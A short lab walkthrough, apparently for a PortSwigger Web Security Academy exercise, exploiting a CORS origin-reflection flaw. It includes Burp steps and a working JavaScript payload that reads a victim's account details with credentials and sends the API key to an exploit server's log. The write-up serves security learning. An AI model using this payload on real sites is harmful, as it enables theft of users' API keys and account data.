# Some cases of Cross-origin resource sharing (CORS)

## 1. CORS vulnerability with basic origin reflection

Log on to the account with `username = wiener`, `password = peter`

Using Burp, the Proxy tab proceeds to search for the `/accountDetails` section where included response information about API key. Then `Send to repeater`.

Adding the Origin: `http:/random-website.com`, then click `send`

After adding Origin, we proceed to return to the website as `Go to exploit server`. Change the server body structure as follows:

```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

Then click `Store` => `View exploit` => `Deliver exploit to victim` => `Access log`

Find the result having the `log?key' return and then insert it into `submit` filed.
